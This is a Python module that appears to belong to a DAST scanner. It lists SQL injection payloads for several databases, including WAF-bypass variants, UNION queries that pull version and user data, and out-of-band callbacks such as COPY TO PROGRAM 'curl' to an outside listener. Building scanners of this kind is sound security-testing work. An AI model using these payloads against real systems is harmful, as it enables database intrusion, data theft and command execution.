"""
DevSecure360 — DAST SQLi Payloads (Enterprise Edition)
=======================================================
SQL Injection payload set: error-based, boolean, time-based, union, OOB, WAF-bypass.
Sources: OWASP Testing Guide v4.2 (WSTG-INPV-05), PayloadsAllTheThings SQLi corpus,
PortSwigger SQL injection cheat sheet, SQLmap payload library.
"""

from dataclasses import dataclass


@dataclass
class Payload:
    value: str
    technique: str   # "error" | "boolean_true" | "boolean_false" | "time" | "oob" | "union"
    canary_id: str = ""


def get_error_payloads() -> list:
    """Payloads that trigger DB-specific error messages — covers MySQL, PostgreSQL, MSSQL, Oracle, SQLite."""
    return [
        # Basic terminators
        Payload("'", "error"),
        Payload('"', "error"),
        Payload("\\", "error"),
        Payload("'--", "error"),
        Payload("'-- -", "error"),
        Payload("' OR '1", "error"),
        Payload("') OR ('1'='1", "error"),
        Payload("1'", "error"),
        Payload('1"', "error"),
        Payload("1'/*", "error"),

        # MSSQL-specific
        Payload("'; SELECT @@version--", "error"),
        Payload("1; SELECT 1/0--", "error"),
        Payload("' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--", "error"),

        # MySQL-specific
        Payload("' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "error"),
        Payload("' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--", "error"),
        Payload("' AND (SELECT 8675 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "error"),

        # PostgreSQL-specific
        Payload("' AND 1=CAST(version() AS INTEGER)--", "error"),
        Payload("' || (SELECT pg_sleep(0)) || '", "error"),

        # Oracle-specific
        Payload("' || (SELECT UTL_HTTP.REQUEST('http://127.0.0.1/') FROM DUAL) || '", "error"),
        Payload("' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT version FROM v$instance))--", "error"),

        # WAF bypass - comment variations
        Payload("'/**/OR/**/1=1--", "error"),
        Payload("'%09OR%091=1--", "error"),     # tab-delimited
        Payload("'+OR+1=1--", "error"),           # plus-encoded space
        Payload("'%20OR%201=1--", "error"),       # URL-encoded space

        # Double URL encoding
        Payload("%2527", "error"),        # double-encoded '
        Payload("%27--", "error"),        # URL-encoded '
        Payload("''", "error"),           # double single quote
    ]


def get_boolean_pairs() -> list:
    """
    Returns pairs of (true_payload, false_payload) for differential analysis.
    True condition returns extra/different content vs false condition.
    """
    return [
        ("' OR '1'='1", "' OR '1'='2"),
        ("' OR 1=1--", "' OR 1=2--"),
        ("1 OR 1=1", "1 OR 1=2"),
        ("' OR 'x'='x", "' OR 'x'='y"),
        ("1' AND '1'='1", "1' AND '1'='2"),
        ("' OR 1=1 LIMIT 1--", "' OR 1=2 LIMIT 1--"),
        # WAF-bypass boolean pairs
        ("'/**/OR/**/'1'='1", "'/**/OR/**/'1'='2"),
        ("1+OR+1=1--", "1+OR+1=2--"),
        ("admin'/**/OR/**/'1'='1", "admin'/**/OR/**/'1'='2"),
    ]


def get_time_payloads() -> list:
    """Payloads that cause DB sleep — confirmed by response time delta > 4.5s."""
    return [
        # MySQL
        Payload("' AND SLEEP(5)--", "time"),
        Payload("' OR SLEEP(5)--", "time"),
        Payload("') OR SLEEP(5)--", "time"),
        Payload("') AND SLEEP(5) AND ('1'='1", "time"),
        Payload("' AND SLEEP(5) AND ''='", "time"),
        Payload("1; SELECT SLEEP(5)--", "time"),
        Payload("' AND BENCHMARK(5000000,MD5('a'))--", "time"),   # MySQL Benchmark

        # MSSQL
        Payload("'; WAITFOR DELAY '0:0:5'--", "time"),
        Payload("1'; WAITFOR DELAY '0:0:5'--", "time"),
        Payload("'; IF 1=1 WAITFOR DELAY '0:0:5'--", "time"),

        # PostgreSQL
        Payload("' AND pg_sleep(5)--", "time"),
        Payload("'; SELECT pg_sleep(5)--", "time"),
        Payload("1; SELECT pg_sleep(5)--", "time"),

        # Oracle
        Payload("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", "time"),

        # SQLite
        Payload("' AND RANDOMBLOB(500000000)--", "time"),

        # WAF-bypass time payloads
        Payload("'%3B+WAITFOR+DELAY+'0%3A0%3A5'--", "time"),  # URL encoded MSSQL
        Payload("'%3B+SELECT+SLEEP(5)--", "time"),               # URL encoded MySQL
        Payload("'/**/AND/**/SLEEP(5)--", "time"),               # comment obfuscation
    ]


def get_union_payloads() -> list:
    """UNION-based payloads to extract data — ordered by column count."""
    return [
        # Determine column count
        Payload("' ORDER BY 1--", "union"),
        Payload("' ORDER BY 2--", "union"),
        Payload("' ORDER BY 5--", "union"),
        Payload("' ORDER BY 10--", "union"),

        # UNION injection (common column counts)
        Payload("' UNION SELECT NULL--", "union"),
        Payload("' UNION SELECT NULL,NULL--", "union"),
        Payload("' UNION SELECT NULL,NULL,NULL--", "union"),
        Payload("' UNION SELECT 1,'devsecure360_union',3--", "union"),
        Payload("' UNION SELECT 1,version(),3--", "union"),          # MySQL version
        Payload("' UNION SELECT 1,@@version,3--", "union"),          # MSSQL version
        Payload("' UNION SELECT 1,user(),3--", "union"),             # MySQL current user
        Payload("' UNION ALL SELECT NULL,NULL--", "union"),
        Payload("' UNION ALL SELECT NULL,NULL,NULL--", "union"),

        # SQLite
        Payload("' UNION SELECT sqlite_version()--", "union"),
    ]


def get_oob_payloads(oob_url: str, canary_id: str) -> list:
    """Out-of-band payloads that trigger network callbacks to OOB listener."""
    return [
        # MySQL
        Payload(f"' UNION SELECT LOAD_FILE('//{oob_url}/{canary_id}')--", "oob", canary_id),
        Payload(f"' AND (SELECT LOAD_FILE('//{oob_url}/{canary_id}'))--", "oob", canary_id),
        # MSSQL
        Payload(f"'; EXEC xp_dirtree '//{oob_url}/{canary_id}'--", "oob", canary_id),
        Payload(f"'; EXEC master..xp_dirtree '//{oob_url}/{canary_id}'--", "oob", canary_id),
        # PostgreSQL
        Payload(f"'; COPY (SELECT '') TO PROGRAM 'curl {oob_url}/{canary_id}'--", "oob", canary_id),
        # Oracle
        Payload(f"' || UTL_HTTP.REQUEST('http://{oob_url}/{canary_id}') || '", "oob", canary_id),
    ]
